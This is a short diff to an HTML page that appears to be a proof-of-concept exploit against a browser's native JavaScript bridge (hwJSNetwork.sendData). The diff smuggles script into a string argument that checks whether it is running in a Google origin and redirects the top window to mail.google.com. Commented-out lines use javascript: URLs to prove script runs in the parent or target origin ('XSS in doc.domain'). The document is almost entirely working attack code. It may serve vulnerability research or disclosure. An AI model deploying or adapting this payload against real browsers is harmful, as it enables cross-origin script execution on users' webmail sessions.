@@ -1,7 +1,7 @@
 <body>
 <script>
-  hwJSNetwork.sendData("https://", "GET", "", "", "console.log(top.window.location.origin); window.setInterval(() => { var o = window.location.origin; if(o.includes('google')) alert(1);}, 10); dummy");
-  window.setTimeout(()=> { top.location="https://mail.google.com"; }, 2000);
+  hwJSNetwork.sendData("https://", "GET", "", "", "console.log(top.window.location.origin); window.setInterval(() => { var o = window.location.origin; if(o.includes('google')) alert(1);}, 10); window.setTimeout(()=> { top.window.location='https://mail.google.com'; }, 5000); dummy");
+  // window.setTimeout(()=> { top.location="https://mail.google.com"; }, 2000);
 //  window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "<b>Executed JS in parent origin: "+window.location.origin+"</b>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');
 //  window.open("javascript:alert('Executed JS in target '+window.location.origin)");
 //  window.open("https://example.com");
